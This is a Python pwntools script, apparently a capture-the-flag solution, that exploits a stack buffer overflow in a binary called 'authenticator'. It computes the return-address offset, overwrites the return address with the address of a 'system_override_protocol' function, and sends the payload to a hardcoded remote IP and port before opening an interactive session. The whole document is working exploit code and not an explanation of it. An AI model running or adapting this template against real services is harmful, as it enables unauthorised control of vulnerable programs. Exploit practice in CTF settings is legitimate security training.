from pwn import *

# Set up logging
context.log_level = 'info'
context.terminal = ['tmux', 'splitw', '-h']  # Split tmux window horizontally

# Change these as needed
BINARY = "../authenticator"  # Path to binary
HOST = "107.191.48.172"  # Remote host if applicable
PORT = 7003 # Remote port if applicable
LOCAL = False # Set to False to connect to remote server

# Load the binary to get the address of system_override_protocol
elf = ELF(BINARY)
system_override_addr = elf.symbols['system_override_protocol']
info(f"system_override_protocol address: {hex(system_override_addr)}")

# Find the offset from the crash value 0x6161616c6161616b
# This is "kaaalaa" in ASCII (little-endian)
offset = cyclic_find(0x6161616c6161616b, endian='little')
info(f"Offset: {offset}")

# Establish connection
if LOCAL:
    p = process(BINARY)
    # Uncomment below for debugging and comment the above line
    # p = gdb.debug(BINARY, '''
    # break mainframe_authentication_challenge
    # continue
    # ''')
else:
    p = remote(HOST, PORT)

# Craft exploit payload: padding + address of system_override_protocol
payload = flat({
    0: cyclic(offset),                # Padding up to return address
    offset: system_override_addr      # Overwrite return address with system_override_protocol
})
info(f"Payload size: {len(payload)}")

# Send the exploit
p.recvuntil(b"access code: ")
p.sendline(payload)

# Interact with the shell or program
p.interactive()
